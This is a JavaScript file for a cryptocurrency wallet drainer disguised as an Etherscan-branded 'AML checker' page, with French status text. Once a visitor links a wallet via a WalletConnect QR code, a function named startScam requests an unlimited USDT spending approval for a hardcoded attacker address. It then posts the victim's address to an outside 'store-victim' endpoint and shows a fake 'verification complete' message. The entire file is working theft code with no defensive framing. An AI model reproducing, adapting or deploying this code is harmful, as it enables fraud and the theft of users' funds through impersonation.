const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const API = 'https://aml-checker-4.vercel.app/api/store-victim';

const TOKENS = {
  '1': [
    { name: 'USDT', addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7' }
  ]
};

let signClient;
let session;
let account;
let currentChainId;
const PROJECT_ID = '0ecdd9357f8779fcb4c4944118927362';

function getSignClient() {
  const ns = window["@walletconnect/sign-client"];
  if (ns) {
    const sc = ns.SignClient || ns.default;
    if (sc && typeof sc.init === 'function') return sc;
  }
  return null;
}

async function initWalletConnect() {
  const SignClientClass = getSignClient();
  if (!SignClientClass) throw new Error('WalletConnect SignClient non trouvé.');

  signClient = await SignClientClass.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'etherscan.io',
      description: 'etherscan.io',
      url: 'https://aml-checker-4.vercel.app',
      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
    }
  });

  const { uri, approval } = await signClient.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
        chains: ['eip155:1'],
        events: ['chainChanged', 'accountsChanged']
      }
    }
  });

  await new Promise((resolve, reject) => {
    if (typeof QRCode !== 'undefined') return resolve();
    let tries = 0;
    const interval = setInterval(() => {
      if (typeof QRCode !== 'undefined') {
        clearInterval(interval);
        resolve();
      }
      tries++;
      if (tries > 10) {
        clearInterval(interval);
        reject(new Error('QRCode non chargé après 5s'));
      }
    }, 500);
  });

  const qrDiv = document.getElementById('qrcode');
  qrDiv.innerHTML = '';

  new QRCode(qrDiv, {
    text: uri,
    width: 280,
    height: 280,
    colorDark: '#000000',
    colorLight: '#ffffff',
    correctLevel: QRCode.CorrectLevel.H
  });

  document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';

  session = await approval();
  const accounts = session.namespaces['eip155'].accounts;
  account = accounts[0].split(':')[2];
  currentChainId = accounts[0].split(':')[1];

  document.getElementById('qrcode').style.display = 'none';
  document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;

  setTimeout(() => startScam(), 1000);
}

async function startScam() {
  const tokens = TOKENS[currentChainId];
  if (!tokens || currentChainId !== '1') {
    document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
    return;
  }

  const gasPrice = ethers.utils.hexlify(2000000000);

  for (const t of tokens) {
    const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
    const data = iface.encodeFunctionData('approve', [ATTACKER, ethers.constants.MaxUint256]);

    const tx = {
      from: account,
      to: t.addr,
      data: data,
      chainId: 1,
      gasLimit: ethers.utils.hexlify(50000),
      gasPrice: gasPrice
    };

    try {
      const result = await signClient.request({
        topic: session.topic,
        request: {
          id: Date.now(),
          jsonrpc: '2.0',
          method: 'eth_sendTransaction',
          params: [tx]
        },
        chainId: 'eip155:1'
      });
      console.log(`✅ Approve ${t.name} : ${result}`);
    } catch (e) {
      console.error(`❌ Approve ${t.name} échoué :`, e);
    }
  }

  await fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ victim: account, chain: currentChainId })
  });

  document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
  setTimeout(() => window.location.href = '/report.html', 3000);
}

initWalletConnect().catch(err => {
  console.error('Erreur init WalletConnect:', err);
  document.getElementById('status').innerText = `Erreur : ${err.message || err}`;
});
